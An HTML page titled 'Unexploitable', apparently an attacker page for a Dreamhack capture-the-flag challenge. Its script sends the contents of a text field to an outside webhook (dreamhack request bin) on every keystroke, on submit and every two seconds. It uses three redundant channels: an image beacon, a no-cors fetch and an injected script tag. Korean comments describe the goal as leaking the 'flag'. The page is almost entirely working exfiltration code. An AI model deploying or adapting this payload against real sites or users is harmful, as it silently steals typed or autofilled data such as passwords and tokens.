 <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Unexploitable</title>
  </head>
  <body>
      <form method="get">
          <input type="text" name="input" id="input" form="">
          <input type="submit" name="submit" id="submit" value="Submit">
      </form>

      <script>
          const WEBHOOK = 'https://dpxmgfj.request.dreamhack.games';
          const input = document.getElementById('input');

          // 전송 함수
          function sendFlag(flag) {
              if (!flag || flag.length === 0) return;

              const url = WEBHOOK + '?flag=' + encodeURIComponent(flag);

              // 방법 1: 이미지 (가장 안정적)
              new Image().src = url;

              // 방법 2: Fetch (백업)
              setTimeout(() => {
                  fetch(url, {
                      method: 'GET',
                      mode: 'no-cors'
                  }).catch(() => {});
              }, 100);

              // 방법 3: 스크립트 태그 (또 다른 백업)
              setTimeout(() => {
                  const script = document.createElement('script');
                  script.src = url;
                  document.head.appendChild(script);
              }, 200);
          }

          // Input 변경 감시 (실시간)
          input.addEventListener('input', (e) => {
              sendFlag(e.target.value);
          });

          // Form submit 감시
          document.querySelector('form').addEventListener('submit', (e) => {
              sendFlag(input.value);
              e.preventDefault();
          });

          // 보안: 주기적으로 현재 값 재전송 (혹시 놓칠 수 있는 경우)
          setInterval(() => {
              if (input.value) {
                  sendFlag(input.value);
              }
          }, 2000);
      </script>
  </body>
  </html>
